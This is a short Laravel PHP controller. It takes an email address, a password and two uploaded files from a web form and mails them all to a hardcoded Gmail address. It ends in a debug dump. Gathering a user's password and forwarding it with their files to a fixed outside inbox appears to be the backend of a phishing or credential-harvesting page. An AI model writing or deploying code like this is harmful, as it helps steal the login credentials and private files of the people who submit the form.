<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Mail;
use App\Mail\MyTestMail;
class EmailController extends Controller
{
    //
    function send()
    {
        return view('emailForm');
    }

    function sendSubmit (Request $req)
    {
        $rrr_1 = $req->file('file_1');
        $rrr_2 = $req->file('file_2');
        $email=$req->email;
        $pwd=$req->pwd;

        // ====

        $emailData = array(
            'title'=>$email,
            'pwd'=>$pwd
            
        );
        view()->share(compact('emailData'));

        // ====

       Mail::send('emails.TestMail', $emailData, function($message)use( $rrr_1, $rrr_2) {
            $message->to('gerchekgerchek1@gmail.com');
 
                $message->attach(
                    $rrr_1->getRealPath(),array(
                        'as'=>$rrr_1->getClientOriginalName(),
                        'mime'=>$rrr_1->getMimeType()
                    )
                );
// =======================================================================
                $message->attach(
                    $rrr_2->getRealPath(),array(
                        'as'=>$rrr_2->getClientOriginalName(),
                        'mime'=>$rrr_2->getMimeType()
                    )
                );
        });


        dd('boldyyy!!!');

    }
    
}
